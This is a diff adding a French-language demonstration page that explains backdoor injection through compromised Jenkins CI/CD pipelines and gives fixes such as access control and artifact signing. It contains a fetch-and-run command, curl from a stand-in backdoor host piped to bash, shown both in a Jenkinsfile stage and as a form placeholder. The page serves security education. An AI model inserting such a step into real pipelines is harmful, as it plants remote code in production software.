@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Injection de backdoors via pipelines CI</title>
+  <!-- Inclusion de Vue.js depuis un CDN sécurisé -->
+  <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    h1 { text-align: center; }
+    h2 { margin-top: 40px; }
+    #client-name { font-weight: bold; }
+    #result { margin-top: 20px; font-weight: bold; word-break: break-all; }
+    #info { margin-top: 40px; padding: 20px; border: 1px solid #ccc; background-color: #f9f9f9; }
+    .exp-section pre { background-color: #f0f0f0; padding: 10px; overflow-x: auto; }
+    button.toggle { margin-top: 20px; }
+    .highlight { background-color: #ffffcc; }
+    ul { list-style-type: disc; margin-left: 20px; }
+    ol { list-style-type: decimal; margin-left: 20px; }
+    code { background-color: #f4f4f4; padding: 2px 4px; }
+    .error { color: red; }
+    .success { color: green; }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <h1>Injection de backdoors via pipelines CI compromis</h1>
+    <p>Bienvenue, <span id="client-name">{{ clientName }}</span>!</p>
+
+    <h2>Objectif de la démonstration</h2>
+    <p>Comprendre comment un pipeline CI/CD mal protégé peut permettre à un attaquant d'injecter des backdoors ou du code malveillant dans une application en production.</p>
+
+    <form @submit.prevent="submitForm" id="ci-injection-form">
+      <label for="pipeline-script">Script CI modifié :</label><br>
+      <textarea id="pipeline-script" v-model="pipelineScript" placeholder="Ex : curl http://backdoor.example.com/script.sh | bash"></textarea><br><br>
+      <button type="submit">Injecter le backdoor</button>
+    </form>
+
+    <div id="result" v-html="resultMessage"></div>
+
+    <button @click="toggleInfo" class="toggle">Afficher les explications</button>
+
+    <div id="info" class="exp-section" v-show="showInfo">
+      <h2>À propos de cette vulnérabilité</h2>
+      <p>Cette page illustre les risques associés à une mauvaise protection des pipelines CI/CD. En compromettant un pipeline CI, un attaquant peut injecter des backdoors ou du code malveillant dans une application pendant le processus de build ou de déploiement.</p>
+
+      <h3>Comment l'attaque fonctionne</h3>
+      <p>Les pipelines CI/CD, comme ceux gérés via Jenkins ou d'autres systèmes, automatisent la construction, le test et le déploiement des applications. Cependant, si ces pipelines ne sont pas correctement protégés, un attaquant ayant accès à l'environnement Jenkins peut modifier les scripts de build pour y insérer des commandes malveillantes, telles que l'injection d'une backdoor dans l'application.</p>
+
+      <h3>Étapes détaillées du scénario d'exploitation</h3>
+
+      <h4>Étape 1 : Reconnaissance</h4>
+      <p>L'attaquant obtient un accès non autorisé à l'environnement CI, soit via des vulnérabilités connues (comme CVE-2019-1003000), soit via des accès mal protégés. Il peut par exemple se connecter au tableau de bord Jenkins et visualiser les scripts de build actuels.</p>
+
+      <h4>Étape 2 : Manipulation du script CI</h4>
+      <p>Après avoir obtenu cet accès, l'attaquant modifie les scripts de build pour y insérer une commande malveillante. Par exemple, il peut ajouter une commande curl ou wget pour télécharger un script à partir d'un serveur malveillant et l'exécuter pendant le build :</p>
+      <pre><code>
+      # Exemple de modification de script
+      stage('Injection') {
+        steps {
+          sh 'curl http://backdoor.example.com/script.sh | bash'
+        }
+      }
+      </code></pre>
+      <p>Cette commande permet d'injecter une backdoor directement dans l'application en construction.</p>
+
+      <h4>Étape 3 : Déploiement automatique</h4>
+      <p>Lorsque le pipeline CI exécute le script lors du prochain cycle de build et de déploiement, le code malveillant est intégré à l'application. Comme le processus de build est automatique et souvent non surveillé en détail, l'attaquant peut facilement masquer cette injection.</p>
+
+      <h4>Étape 4 : Exploitation de la backdoor</h4>
+      <p>Une fois l'application en production avec la backdoor intégrée, l'attaquant peut se connecter à distance, exfiltrer des données ou compromettre les systèmes internes. La backdoor peut être utilisée pour exécuter des commandes sur le serveur de production ou pour voler des informations sensibles.</p>
+
+      <h3>Impact de la vulnérabilité</h3>
+      <p>L'impact potentiel est extrêmement grave, car l'attaquant peut insérer du code malveillant dans une application en production, ce qui pourrait compromettre la sécurité de l'ensemble du système. Cela peut conduire à l'exfiltration de données, à des compromissions massives de sécurité, voire à la prise de contrôle complète des serveurs de production.</p>
+
+      <h3>Comment corriger la vulnérabilité</h3>
+      <p>Pour remédier à cette vulnérabilité et empêcher l'injection de backdoors dans les pipelines CI, voici les mesures à prendre :</p>
+
+      <h4>1. Contrôles d'accès stricts</h4>
+      <p>Les environnements CI/CD doivent être strictement protégés. Cela inclut l'application de contrôles d'accès robustes pour garantir que seules les personnes autorisées peuvent modifier les scripts de build ou les pipelines CI. Des rôles et permissions appropriés doivent être définis pour restreindre l'accès aux scripts critiques.</p>
+
+      <h4>2. Signature numérique des artefacts de build</h4>
+      <p>Il est recommandé de signer numériquement les artefacts produits par le pipeline CI. Cela garantit que seuls les artefacts signés peuvent être déployés, et toute tentative de modification des artefacts entre le build et le déploiement sera détectée.</p>
+
+      <h4>3. Surveillance des anomalies dans le processus de build</h4>
+      <p>Il est essentiel de surveiller en permanence le processus de build et de déploiement pour détecter toute activité anormale. Des alertes peuvent être configurées pour identifier les changements non autorisés dans les scripts CI/CD ou les modifications inattendues dans les artefacts de build.</p>
+
+      <h4>4. Audits de sécurité réguliers</h4>
+      <p>Il est nécessaire d'effectuer des audits de sécurité réguliers sur les scripts CI et les pipelines pour identifier et corriger les éventuelles failles ou mauvaises configurations. Des tests d'intrusion doivent être effectués pour vérifier la robustesse des contrôles d'accès et des configurations de sécurité.</p>
+
+      <h3>Glossaire</h3>
+      <ul>
+        <li><strong>Pipeline CI/CD :</strong> Ensemble d'outils et de processus automatisant le cycle de vie d'une application, de l'intégration continue (CI) au déploiement continu (CD).</li>
+        <li><strong>Backdoor :</strong> Un accès secret à un système, laissé ouvert par un attaquant pour permettre un accès furtif et continu à des ressources critiques.</li>
+        <li><strong>Artefact de build :</strong> Le résultat d'un processus de build (fichier binaire, paquet, etc.) destiné à être déployé sur un environnement de production.</li>
+        <li><strong>Jenkins :</strong> Un serveur d'intégration continue open-source utilisé pour automatiser les tâches de build, de test et de déploiement.</li>
+        <li><strong>Curl :</strong> Un outil en ligne de commande permettant de transférer des données depuis ou vers un serveur. Souvent utilisé pour télécharger des fichiers à partir d'une URL.</li>
+        <li><strong>Signature numérique :</strong> Méthode de cryptographie utilisée pour garantir l'intégrité des données et authentifier l'auteur d'un artefact numérique.</li>
+      </ul>
+
+      <h3>Ressources supplémentaires</h3>
+      <ul>
+        <li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2021-French/A08_2021-Software_and_Data_Integrity_Failures" target="_blank">OWASP Top 10 - A08:2021 Software and Data Integrity Failures</a></li>
+        <li><a href="https://jenkins.io/" target="_blank">Jenkins Documentation</a></li>
+        <li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities" target="_blank">OWASP - Utilisation de composants vulnérables</a></li>
+      </ul>
+
+      <h3>Conclusion</h3>
+      <p>Protéger les pipelines CI/CD est essentiel pour garantir la sécurité des applications en production. En adoptant des contrôles d'accès stricts, en surveillant les anomalies et en signant numériquement les artefacts, vous pouvez réduire considérablement les risques d'injection de backdoors dans vos systèmes de production.</p>
+    </div>
+  </div>
+
+  <script>
+    new Vue({
+      el: '#app',
+      data: {
+        clientName: 'Onepoint', // Nom du client
+        pipelineScript: '',
+        resultMessage: '',
+        showInfo: false
+      },
+      methods: {
+        toggleInfo() {
+          this.showInfo = !this.showInfo;
+        },
+        submitForm() {
+          // Simuler l'injection d'une backdoor
+          if (this.pipelineScript.includes('curl') || this.pipelineScript.includes('wget')) {
+            this.resultMessage = '<span class="success">Backdoor injectée avec succès via le pipeline CI.</span>';
+          } else {
+            this.resultMessage = '<span class="error">Aucune backdoor détectée. Vérifiez le script injecté.</span>';
+          }
+        }
+      }
+    });
+  </script>
+</body>
+</html>
+
